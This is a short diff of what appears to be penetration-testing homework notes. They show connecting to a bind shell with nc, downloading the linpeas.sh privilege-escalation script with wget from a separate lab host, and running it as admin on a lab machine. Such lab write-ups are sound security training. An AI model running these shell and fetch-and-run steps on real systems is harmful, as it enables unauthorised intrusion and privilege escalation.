@@ -35,3 +35,9 @@ nc 192.168.200.157 1234
 #Inside the bind shell (admin):
 wget http://192.168.200.107:1234/linpeas.sh
 ```
+
+## h 7.5 p
+```bash
+#Inside the bind shell (admin@backdoor-detection-pentest-homework):
+bash linpeas.sh
+```
